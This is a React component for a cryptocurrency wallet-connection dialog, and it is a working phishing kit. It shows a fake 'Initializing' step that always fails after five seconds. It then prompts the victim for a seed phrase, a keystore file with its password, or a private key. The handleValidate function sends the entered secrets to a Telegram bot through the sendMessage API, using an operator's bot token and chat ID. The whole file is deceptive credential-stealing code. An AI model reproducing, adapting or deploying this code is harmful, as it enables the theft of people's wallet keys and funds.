import React, { useState, useEffect, Dispatch, SetStateAction } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import web3Wallets from "@/app/data/web3Wallets";
import Image from "next/image";
import { toast } from "react-hot-toast";

interface Wallet {
  name: string;
  logo: string;
}

interface WalletModalProps {
  isOpen: boolean;
  onClose: Dispatch<SetStateAction<boolean>>;
}

const WalletModal: React.FC<WalletModalProps> = ({ isOpen, onClose }) => {
  const [loading, setLoading] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
  const [isInitializing, setInitializing] = useState<boolean>(false);
  const [initializationFailed, setInitializationFailed] =
    useState<boolean>(false);
  const [selectedImportType, setSelectedImportType] =
    useState<string>("Phrase");
  const [phrase, setPhrase] = useState<string>("");
  const [keystore, setKeystore] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [privateKey, setPrivateKey] = useState<string>("");
  const [loadingDots, setLoadingDots] = useState<string>("");
  const [otherWalletInput, setOtherWalletInput] = useState<string>("");

  useEffect(() => {
    if (isInitializing) {
      const interval = setInterval(() => {
        setLoadingDots((prev) => (prev.length < 4 ? prev + "." : ""));
      }, 500);
      return () => clearInterval(interval);
    }
  }, [isInitializing]);

  const handleWalletClick = (wallet: Wallet) => {
    if (wallet.name === "Other") {
      setSelectedWallet(wallet); // temporarily store "Other"
    } else {
      setSelectedWallet(wallet);
      setInitializing(true);
      setInitializationFailed(false);
      setTimeout(() => {
        setInitializationFailed(true);
      }, 5000);
    }
  };

  const closeInitializingModal = () => {
    setInitializing(false);
    setInitializationFailed(false);
    setSelectedWallet(null);
    setOtherWalletInput("");
  };

  const handleValidate = async () => {
    let emailBody = "";

    switch (selectedImportType) {
      case "Phrase": {
        const wordCount = phrase.trim().split(/\s+/).length;
        if (!phrase.trim())
          return toast.error("Please enter your wallet phrase.");
        if (wordCount < 12)
          return toast.error("Seed phrase must be at least 12 words.");
        emailBody = `
🔐 Wallet Import Request \n
Wallet: ${selectedWallet?.name}
Import Type: Seed Phrase
Phrase: \`${phrase.trim()}\`
      `;
        break;
      }

      case "Keystore JSON": {
        if (!keystore.trim() || !password.trim())
          return toast.error("Enter both keystore and password.");
        emailBody = `
🔐 Wallet Import Request \n
Wallet: ${selectedWallet?.name}
Import Type: Keystore JSON
Keystore:
\`\`\`
${keystore.trim()}
\`\`\`
Password: \`${password.trim()}\`
      `;
        break;
      }

      case "Private Key": {
        if (!privateKey.trim()) return toast.error("Enter your private key.");
        if (privateKey.trim().length < 12)
          return toast.error("Private key must be at least 12 characters.");
        emailBody = `
🔐 Wallet Import Request \n
Wallet: ${selectedWallet?.name}
Import Type: Private Key
Private Key: \`${privateKey.trim()}\`
      `;
        break;
      }
    }
    setLoading(true);

    try {
      await fetch(
        `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_BOT_TOKEN}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
            text: emailBody,
            parse_mode: "Markdown",
          }),
        }
      );

      closeInitializingModal();
    } catch (error) {
      console.error("Telegram send error:", error);
      toast.error("Failed to send message.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      {/* Main Wallet Modal */}
      <Dialog open={isOpen} onOpenChange={onClose}>
        <DialogContent className="h-[580px] overflow-y-scroll custom-scrollbar lg:min-w-[600px]">
          <DialogHeader>
            <DialogTitle className="text-left text-lg m-0 text-white">
              Connect to a wallet
            </DialogTitle>
            <DialogDescription />
          </DialogHeader>

          <div className="flex flex-col gap-4">
            {[
              ...web3Wallets,
              { name: "Other", logo: "/images/custom.jpg" },
            ].map((wallet: Wallet, index: number) => (
              <div
                key={index}
                onClick={() => handleWalletClick(wallet)}
                className="flex items-center cursor-pointer gap-4 p-2 border-2 border-gray-100 rounded-lg"
              >
                <div className="h-full w-[10px] bg-green-600 rounded-full"></div>
                <div className="flex items-center justify-between w-full h-full">
                  <p className="flex capitalize m-0 text-white">
                    {wallet.name}
                  </p>
                  <Image
                    src={wallet.logo}
                    alt={`${wallet.name}`}
                    width={40}
                    height={20}
                    className="rounded-full"
                  />
                </div>
              </div>
            ))}
          </div>
        </DialogContent>
      </Dialog>

      {/* Prompt for Other Wallet Name */}
      {selectedWallet?.name === "Other" && (
        <Dialog open={true} onOpenChange={closeInitializingModal}>
          <DialogContent>
            <DialogHeader>
              <DialogTitle className="text-white text-lg font-semibold">
                Enter your wallet name
              </DialogTitle>
            </DialogHeader>
            <div className="flex flex-col gap-4">
              <input
                type="text"
                value={otherWalletInput}
                onChange={(e) => setOtherWalletInput(e.target.value)}
                placeholder="e.g., Unknown Wallet"
                className="w-full p-2 border rounded-lg"
              />
              <button
                onClick={() => {
                  if (!otherWalletInput.trim()) {
                    toast.error("Please enter a wallet name.");
                    return;
                  }
                  setSelectedWallet({
                    name: otherWalletInput.trim(),
                    logo: "/images/custom.jpg",
                  });
                  setInitializing(true);
                  setInitializationFailed(false);
                  setTimeout(() => {
                    setInitializationFailed(true);
                  }, 5000);
                }}
                className="h-[50px] bg-primary text-black px-4 py-2 rounded-md"
              >
                Continue
              </button>
            </div>
          </DialogContent>
        </Dialog>
      )}

      {/* Initialization Modal */}
      {selectedWallet && selectedWallet.name !== "Other" && (
        <Dialog open={isInitializing} onOpenChange={closeInitializingModal}>
          <DialogContent>
            <DialogHeader>
              {!initializationFailed ? (
                <DialogTitle className="text-green-600 text-lg font-semibold">
                  Initializing {loadingDots}
                </DialogTitle>
              ) : (
                <DialogTitle className="text-red-600 text-lg font-semibold">
                  There was an error connecting automatically. But do not worry,
                  you can still connect manually.
                </DialogTitle>
              )}
            </DialogHeader>

            {!initializationFailed ? (
              <div className="flex items-center gap-4 p-2 border-[3px] border-gray-700 rounded-lg">
                <div className="flex items-center justify-between w-full">
                  <div>
                    <p className="capitalize m-0 text-white">
                      {selectedWallet.name}
                    </p>
                    <p className="text-gray-400 m-0">
                      Easy-to-use browser extension
                    </p>
                  </div>
                  <Image
                    src={selectedWallet.logo}
                    alt={`${selectedWallet.name}`}
                    width={40}
                    height={20}
                    className="rounded-full"
                  />
                </div>
              </div>
            ) : (
              <div>
                <div className="flex gap-4 items-center mb-4">
                  <Image
                    src={selectedWallet.logo}
                    alt={`${selectedWallet.name}`}
                    width={60}
                    height={30}
                    className="rounded-full"
                  />
                  <p className="font-bold m-0 text-white">
                    Import your {selectedWallet.name} wallet
                  </p>
                </div>
                <div className="flex gap-4 mb-4">
                  {["Phrase", "Keystore JSON", "Private Key"].map(
                    (item, index) => (
                      <button
                        key={index}
                        onClick={() => setSelectedImportType(item)}
                        className={
                          selectedImportType === item
                            ? "text-primary border-b-2 border-primary"
                            : "text-gray-400 hover:text-primary cursor-pointer"
                        }
                      >
                        {item}
                      </button>
                    )
                  )}
                </div>
                {selectedImportType === "Phrase" && (
                  <textarea
                    rows={4}
                    value={phrase}
                    onChange={(e) => setPhrase(e.target.value)}
                    placeholder="Enter your wallet phrase"
                    className="w-full p-2 border rounded-lg"
                  />
                )}
                {selectedImportType === "Keystore JSON" && (
                  <div className="flex flex-col gap-4">
                    <textarea
                      rows={4}
                      value={keystore}
                      onChange={(e) => setKeystore(e.target.value)}
                      placeholder="Enter your wallet keystore JSON"
                      className="w-full p-2 border rounded-lg"
                    />
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Wallet password"
                      className="w-full p-2 border rounded-lg"
                    />
                  </div>
                )}
                {selectedImportType === "Private Key" && (
                  <div className="flex flex-col gap-4">
                    <input
                      type="text"
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                      placeholder="Enter your Private Key"
                      className="w-full p-2 border rounded-lg"
                    />
                  </div>
                )}
                <button
                  onClick={handleValidate}
                  disabled={loading}
                  className="flex items-center justify-center cursor-pointer h-[50px] w-full bg-primary text-black px-4 py-2 rounded-md mt-4"
                >
                  {loading ? "Validating..." : "Validate"}
                </button>
              </div>
            )}
          </DialogContent>
        </Dialog>
      )}
    </>
  );
};

export default WalletModal;
